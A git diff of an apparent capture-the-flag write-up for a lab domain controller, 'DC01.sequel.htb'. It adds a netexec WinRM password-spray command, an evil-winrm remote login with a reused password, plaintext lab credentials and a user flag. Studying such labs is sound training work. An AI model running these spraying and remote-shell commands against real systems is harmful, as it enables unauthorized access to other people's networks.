@@ -13,7 +13,7 @@ Check all open ports
 - **-p-**: Scan all 65,535 ports
 - **-sS**: **SYN** scan is a stealth scan that check if a TCP port is open sending a SYN packet. If the target respond with `SYN-ACK` the port is open instance if respond with `RST` is closed. This scan **doesn't** complete a TCP handshake this reduce the noise and logging, this allow us to hide from **IDS** or **firewall**
 
-Extract all ports from `.gnamp` file using `grep` and save all in $ports variable
+Extract all ports from `.gnamp` file using `grep` and save all in **$ports** variable
 ```bash
 ports=$(grep "Ports:" nmap/massive_scan.gnmap | grep -oP '\d+(?=/open/tcp)' | paste -sd,)
 ```
@@ -149,11 +149,32 @@ netexec mssql DC01.sequel.htb -u sa -p 'MSSQLP@ssw0rd!' --local-auth -X "powersh
 Now under the  `C:\SQL2019\ExpressAdv_ENU` installation folder of MSSQL we can see the `sql-Configuration.INI` file that contains `sql_svc` user's credentials.
 
 ![](../../../../Assest/Pasted%20image%2020250721012901.png)
-
+!TODO: How to create a users list
 !TODO: spray attack with founded password (i cant log in with `sql_svc` user)
+![](../../../../Assest/Pasted%20image%2020250724205831.png)
+
+
+As we see during the port scanning  the `5985` port is open. This port typically is used by the [`winrm` service](https://www.speedguide.net/port.php?port=5985).  we can try to brute force our users list with the password founded in the SQL config file
+```bash
+netexec winrm DC01.sequel.htb -u users -p 'WqSZAF6CysDQbGb3' -d sequel --continue-on-success --verbose
+```
+![](../../../../Assest/Pasted%20image%2020250724210228.png)
+The `ryan` user has reused the  `WqSZAF6CysDQbGb3`. We can access through `evil-winrm` on the **DC01.sequel.htb** as `ryan` user an take the first flag under the desktop.
+
+```bash
+evil-winrm -i DC01.sequel.htb -u 'SEQUEL\ryan' -p 'WqSZAF6CysDQbGb3'
+```
+![](../../../../Assest/Pasted%20image%2020250724210452.png)
 
 # Privilege Escalation
 
+![](../../../../Assest/Pasted%20image%2020250724230053.png)
+
+
+![](../../../../Assest/Pasted%20image%2020250724230456.png)
+
+
+!TODO: Reset password; and check vulnerable template 
 # Loot
 
 ## Credentials
@@ -163,5 +184,10 @@ Now under the  `C:\SQL2019\ExpressAdv_ENU` installation folder of MSSQL we can s
 | rose           | KxEPkKe6R8su     |
 | sa@sequel.htb  | MSSQLP@ssw0rd!   |
 | SEQUEL\sql_svc | WqSZAF6CysDQbGb3 |
+| SEQUEL\ryan    | WqSZAF6CysDQbGb3 |
 
 ## Flags
+
+| name     | falg                             |
+| -------- | -------------------------------- |
+| user.txt | b3370e6499147f8772878b0bc36294c0 |
